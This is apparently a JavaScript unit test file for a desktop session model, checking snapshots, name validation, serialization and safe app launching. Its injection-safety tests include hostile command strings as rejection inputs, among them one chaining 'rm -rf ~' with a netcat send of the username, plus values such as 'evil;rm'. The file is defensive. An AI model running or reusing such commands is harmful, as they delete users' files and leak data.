const assert = require("assert");
const S = require("../Services/System/SessionModel.js");

// ── snapshot build from a window list (appId → command, de-dupe) ──────
{
    const windows = [
        { appId: "org.gnome.Calculator", title: "Calculator" },
        { appId: "firefox", title: "Mozilla Firefox" },
        { appId: "firefox", title: "Mozilla Firefox - 2" }, // dup app
        { appId: "", title: "no app id" },                  // skipped
        { title: "missing appId" },                         // skipped
    ];
    const snap = S.buildSnapshot("My Work", windows, [], 1000);
    assert.ok(snap, "snapshot built");
    assert.strictEqual(snap.name, "My Work");
    assert.strictEqual(snap.created, 1000);
    assert.strictEqual(snap.apps.length, 2, "de-duped + empties dropped");
    assert.strictEqual(snap.apps[0].command, "org.gnome.Calculator");
    assert.strictEqual(snap.apps[0].title, "Calculator");
    assert.strictEqual(snap.apps[1].command, "firefox");
}

// ── empty session (no usable windows) ─────────────────────────────────
{
    const snap = S.buildSnapshot("Empty", [{ appId: "" }, {}], [], 5);
    assert.ok(snap);
    assert.strictEqual(snap.apps.length, 0, "empty session has no apps");
    const snap2 = S.buildSnapshot("Empty2", undefined, [], 5);
    assert.strictEqual(snap2.apps.length, 0, "null window list → empty");
}

// ── name validation: empty / whitespace / too-long / duplicate ────────
{
    assert.strictEqual(S.validateName("", []).ok, false);
    assert.strictEqual(S.validateName("   ", []).ok, false);
    assert.strictEqual(S.validateName("  ok  ", []).name, "ok", "trims");
    const tooLong = "x".repeat(S.MAX_NAME_LEN + 1);
    assert.strictEqual(S.validateName(tooLong, []).ok, false);

    const existing = [{ name: "Work" }, { name: "Play" }];
    assert.strictEqual(S.validateName("Work", existing).ok, false, "dup rejected");
    assert.strictEqual(S.validateName("work", existing).ok, false, "dup case-insensitive");
    assert.strictEqual(S.validateName("Other", existing).ok, true);
    // Overwriting self is allowed.
    assert.strictEqual(S.validateName("Work", existing, "Work").ok, true, "overwrite self ok");

    // buildSnapshot returns null on an invalid name.
    assert.strictEqual(S.buildSnapshot("", [], []), null);
    assert.strictEqual(S.buildSnapshot("Work", [], existing), null);
}

// ── save / load round-trip (serialize → deserialize) ──────────────────
{
    const snap = S.buildSnapshot("Session A", [{ appId: "kitty", title: "Term" }], [], 42);
    let sessions = S.upsertSession([], snap);
    assert.strictEqual(sessions.length, 1);

    const text = S.serializeSessions(sessions);
    const back = S.deserializeSessions(text);
    assert.deepStrictEqual(back, sessions, "round-trip preserves data");

    // upsert replaces an existing same-name session (case-insensitive).
    const snap2 = S.buildSnapshot("session a", [{ appId: "vim" }], [], 99, "session a");
    const replaced = S.upsertSession(sessions, snap2);
    assert.strictEqual(replaced.length, 1, "same name replaced, not appended");
    assert.strictEqual(replaced[0].apps[0].command, "vim");
    // upsert must not mutate the input array.
    assert.strictEqual(sessions[0].apps[0].command, "kitty", "input not mutated");

    // remove + find.
    assert.strictEqual(S.findSession(replaced, "SESSION A").apps[0].command, "vim");
    const removed = S.removeSession(replaced, "session a");
    assert.strictEqual(removed.length, 0);
    assert.strictEqual(S.findSession(removed, "session a"), null);
}

// ── deserialize tolerates garbage ─────────────────────────────────────
{
    assert.deepStrictEqual(S.deserializeSessions("not json"), []);
    assert.deepStrictEqual(S.deserializeSessions(null), []);
    assert.deepStrictEqual(S.deserializeSessions("{}"), []);
    // entries with bad shape are dropped; valid ones kept + normalized.
    const mixed = JSON.stringify([
        { name: "Good", apps: [{ command: "a" }, { command: "" }, "junk"] },
        { name: "" },          // dropped (empty name)
        null,                  // dropped
        { apps: [] },          // dropped (no name)
    ]);
    const norm = S.deserializeSessions(mixed);
    assert.strictEqual(norm.length, 1);
    assert.strictEqual(norm[0].apps.length, 1, "bad app entries dropped");
    assert.strictEqual(norm[0].apps[0].appId, "a", "appId defaults to command");
}

// ── INJECTION SAFETY: malicious command must never become a shell str ─
{
    // A command with spaces/metacharacters is NOT a valid desktop id, so
    // it is REJECTED outright (null) — never exec'd, never shell-parsed.
    const evil = "rm -rf ~; touch /tmp/pwned && echo $(whoami) | nc x 1";
    assert.strictEqual(S.buildLaunchArgv({ command: evil }), null,
        "metacharacter command is rejected, not launched");

    // An absolute/relative path is likewise rejected — a hostile appId of
    // "/tmp/payload" must not be exec'd directly.
    assert.strictEqual(S.buildLaunchArgv({ command: "/tmp/payload" }), null);
    assert.strictEqual(S.buildLaunchArgv({ command: "../../bin/sh" }), null);
    assert.strictEqual(S.buildLaunchArgv({ command: "evil;rm" }), null,
        "semicolon disqualifies the id");
    assert.strictEqual(S.buildLaunchArgv({ command: "a b" }), null,
        "whitespace disqualifies the id");
    assert.strictEqual(S.isDesktopId("/tmp/x"), false);
    assert.strictEqual(S.isDesktopId("org.gnome.Calc"), true);

    // A clean desktop id launches ONLY via gtk-launch with the id as a
    // distinct argv token — the single allowed launch path.
    const safe = S.buildLaunchArgv({ command: "org.gnome.Calculator" });
    assert.deepStrictEqual(safe, ["gtk-launch", "org.gnome.Calculator"]);
    assert.ok(S.isSafeArgv(safe), "argv is a plain string array");
    assert.notStrictEqual(safe[0], "sh");
    assert.notStrictEqual(safe[0], "bash");

    // Empty command → null (caller skips).
    assert.strictEqual(S.buildLaunchArgv({ command: "  " }), null);
    assert.strictEqual(S.buildLaunchArgv(""), null);

    // quoteShellArg neutralizes embedded single quotes for the rare
    // shell-needed path.
    assert.strictEqual(S.quoteShellArg("a'b"), "'a'\\''b'");
}

// ── round-trip through a built-from-windows snapshot survives serialize ─
{
    const snap = S.buildSnapshot("Mixed", [
        { appId: "org.kde.konsole", title: "Konsole" },
        { appId: "weird app; rm", title: "Bad" },
    ], [], 7);
    const back = S.deserializeSessions(S.serializeSessions(S.upsertSession([], snap)));
    const argv0 = S.buildLaunchArgv(back[0].apps[0]);
    const argv1 = S.buildLaunchArgv(back[0].apps[1]);
    assert.deepStrictEqual(argv0, ["gtk-launch", "org.kde.konsole"]);
    assert.strictEqual(argv1, null, "malicious command is rejected after round-trip");
}

// ── dedupe-on-load: duplicate session names + duplicate apps collapse ─
{
    const dupes = JSON.stringify([
        { name: "Work", created: 1, apps: [{ command: "a" }, { command: "a" }, { command: "b" }] },
        { name: "work", created: 2, apps: [{ command: "c" }] }, // dup name (case-insensitive)
        { name: "Play", created: 3, apps: [{ command: "d" }] },
    ]);
    const norm = S.deserializeSessions(dupes);
    assert.strictEqual(norm.length, 2, "duplicate session name dropped, first kept");
    assert.strictEqual(norm[0].name, "Work");
    assert.strictEqual(norm[0].created, 1, "first Work entry kept");
    assert.strictEqual(norm[0].apps.length, 2, "duplicate app command de-duped");
    assert.strictEqual(norm[1].name, "Play");

    // __proto__ must behave as an ordinary key (null-proto dedupe maps).
    const proto = JSON.stringify([
        { name: "__proto__", apps: [{ command: "__proto__" }, { command: "__proto__" }] },
        { name: "__PROTO__", apps: [{ command: "x" }] }, // dup name (case-insensitive)
    ]);
    const pn = S.deserializeSessions(proto);
    assert.strictEqual(pn.length, 1, "__proto__ session name de-duped");
    assert.strictEqual(pn[0].apps.length, 1, "__proto__ app command de-duped");
}

console.log("session-model: all assertions passed");
process.exit(0);
